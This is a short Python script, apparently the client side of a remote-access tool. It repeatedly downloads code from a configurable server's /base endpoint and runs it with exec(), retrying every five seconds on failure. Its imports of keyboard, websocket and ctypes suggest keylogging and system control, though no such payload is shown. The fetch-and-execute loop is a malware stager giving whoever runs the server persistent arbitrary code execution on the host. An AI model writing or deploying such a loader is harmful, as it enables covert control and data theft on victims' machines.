import string
import sys
import websocket
import keyboard
import os
import platform
import uuid
from tempfile import TemporaryFile
import base64
import shutil
import zlib
from struct import pack, calcsize, unpack
import json
import ctypes
import lzma
import gzip
import urllib.request
import urllib.parse
import argparse
import time
import traceback

SERVER_ADDRESS = "http://127.0.0.1:5000"


if __name__ == '__main__':
    parsers = argparse.ArgumentParser()
    parsers.add_argument("-u", "--url", help="remote server url", default=SERVER_ADDRESS)
    args = parsers.parse_args()
    while True:
        try:
            url = "{}/base".format(args.url)
            parsed = urllib.parse.urlparse(url)
            WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
            req = urllib.request.urlopen(parsed.geturl())
            code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)
            exec(code)
        except BaseException as e:
            traceback.print_exc()
            time.sleep(5)
